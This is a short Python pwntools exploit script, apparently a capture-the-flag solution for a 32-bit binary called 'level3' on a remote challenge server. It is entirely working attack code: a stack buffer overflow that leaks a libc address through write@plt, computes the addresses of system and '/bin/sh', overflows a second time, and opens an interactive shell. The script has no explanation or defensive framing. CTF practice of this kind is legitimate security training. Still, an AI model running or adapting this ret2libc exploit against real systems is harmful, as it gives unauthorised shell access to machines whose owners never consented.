from pwn import * 
 
#p = process('./level3')
p=remote("111.198.29.45",35371)
elf = ELF("./level3")
libc = ELF('libc.so.6')
p.recvuntil("Input:\n")
write_plt = elf.plt['write']
libc_start_main_got  = elf.got['__libc_start_main']
payload = flat(["a"*0x8c,write_plt,0x08048484],1,libc_start_main_got,4)
p.sendline(payload)
print 'get the libc base address'
libc_start_main_addr = u32(p.recv()[0:4])
libc_base = libc_start_main_addr - libc.symbols['__libc_start_main']
system = libc_base + libc.symbols['system']
bin_addr = libc_base + libc.search('/bin/sh').next()
#p.recvuntil("Input:\n")
payload = flat(["a"*0x8c, system,0xdeadbeef , bin_addr])
p.sendline(payload)
p.interactive()
